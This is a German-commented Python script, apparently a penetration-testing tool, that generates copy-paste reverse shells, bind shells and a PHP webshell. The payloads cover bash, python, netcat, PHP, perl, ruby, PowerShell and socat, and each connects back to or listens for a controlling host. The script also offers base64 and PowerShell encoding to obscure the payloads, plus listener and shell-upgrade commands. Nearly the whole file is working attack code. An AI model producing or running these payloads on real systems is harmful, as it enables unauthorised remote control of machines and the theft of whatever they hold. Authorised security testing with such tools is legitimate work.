#!/usr/bin/env python3
"""
Payload Generator - Erstellt Reverse Shells und Bind Shells in verschiedenen Sprachen.
Generiert Copy-Paste-fertige Payloads für Penetration Testing.
"""

import sys
import argparse
import base64
import urllib.parse
import socket


PAYLOADS = {
    "bash": {
        "reverse": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "reverse_alt": "/bin/bash -l > /dev/tcp/{host}/{port} 0<&1 2>&1",
        "bind": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp {port} >/tmp/f",
    },
    "python": {
        "reverse": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'""",
        "bind": """python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/bash","-i"])'""",
    },
    "netcat": {
        "reverse": "nc -e /bin/bash {host} {port}",
        "reverse_alt": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f",
        "bind": "nc -lvnp {port} -e /bin/bash",
        "bind_alt": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvnp {port} >/tmp/f",
    },
    "php": {
        "reverse": """php -r '$sock=fsockopen("{host}",{port});exec("/bin/bash -i <&3 >&3 2>&3");'""",
        "bind": """php -r '$s=socket_create(AF_INET,SOCK_STREAM,0);socket_bind($s,"0.0.0.0",{port});socket_listen($s);$c=socket_accept($s);while(1){{$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out);}}'""",
        "webshell": """<?php if(isset($_REQUEST['cmd'])){{echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>";}} ?>""",
    },
    "perl": {
        "reverse": """perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'""",
    },
    "ruby": {
        "reverse": """ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'""",
    },
    "powershell": {
        "reverse": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
    },
    "socat": {
        "reverse": "socat TCP:{host}:{port} EXEC:/bin/bash",
        "reverse_tty": "socat TCP:{host}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
        "bind": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
    },
}

LISTENERS = {
    "netcat": "nc -lvnp {port}",
    "socat": "socat -d -d TCP-LISTEN:{port} STDOUT",
    "socat_tty": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}",
    "pwncat": "pwncat-cs -lp {port}",
}


def get_local_ip():
    """Ermittelt die lokale IP-Adresse."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def encode_payload(payload, encoding):
    """Kodiert den Payload."""
    if encoding == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"
    elif encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "powershell_b64":
        # PowerShell benötigt UTF-16LE Base64
        encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
        return f"powershell -enc {encoded}"
    return payload


def generate_upgrade_shell():
    """Generiert Befehle zum Shell-Upgrade (dumb -> interactive)."""
    return """
# Python PTY Upgrade:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Dann im eigenen Terminal:
# Ctrl+Z (Shell in Background)
stty raw -echo; fg

# In der Shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 cols 120
"""


def run(args=None):
    parser = argparse.ArgumentParser(
        description="Payload Generator - Reverse/Bind Shells",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-l", "--lhost", help="Listener IP (Standard: auto-detect)")
    parser.add_argument("-p", "--lport", type=int, default=4444, help="Listener Port (Standard: 4444)")
    parser.add_argument("-t", "--type", choices=list(PAYLOADS.keys()),
                        help="Payload-Sprache")
    parser.add_argument("-m", "--mode", choices=["reverse", "bind"], default="reverse",
                        help="Modus (Standard: reverse)")
    parser.add_argument("-e", "--encode", choices=["base64", "url", "powershell_b64"],
                        help="Payload kodieren")
    parser.add_argument("--all", action="store_true", help="Alle Payloads anzeigen")
    parser.add_argument("--listener", action="store_true", help="Listener-Befehle anzeigen")
    parser.add_argument("--upgrade", action="store_true", help="Shell-Upgrade-Befehle anzeigen")

    args = parser.parse_args(args)

    host = args.lhost or get_local_ip()
    port = args.lport

    print(f"\n{'═' * 60}")
    print(f"  Payload Generator")
    print(f"  LHOST: {host} | LPORT: {port}")
    print(f"{'═' * 60}")

    if args.upgrade:
        print(generate_upgrade_shell())
        return

    if args.listener:
        print(f"\n  Listener-Befehle (Port {port}):\n")
        for name, cmd in LISTENERS.items():
            print(f"  [{name}]")
            print(f"  {cmd.format(port=port)}\n")
        return

    if args.all:
        languages = list(PAYLOADS.keys())
    elif args.type:
        languages = [args.type]
    else:
        languages = list(PAYLOADS.keys())

    mode = args.mode

    print(f"\n  Modus: {mode.upper()} Shell\n")

    for lang in languages:
        payloads = PAYLOADS[lang]
        variants = {k: v for k, v in payloads.items() if k.startswith(mode)}

        if not variants:
            continue

        for variant_name, template in variants.items():
            payload = template.format(host=host, port=port)

            if args.encode:
                payload = encode_payload(payload, args.encode)

            label = f"{lang}" if variant_name == mode else f"{lang} ({variant_name.replace(mode + '_', '')})"
            print(f"  ┌─ {label}")
            print(f"  │  {payload}")
            print(f"  └{'─' * 55}")

    # Listener-Hinweis
    print(f"\n  Listener starten:")
    print(f"  nc -lvnp {port}")


if __name__ == "__main__":
    run()
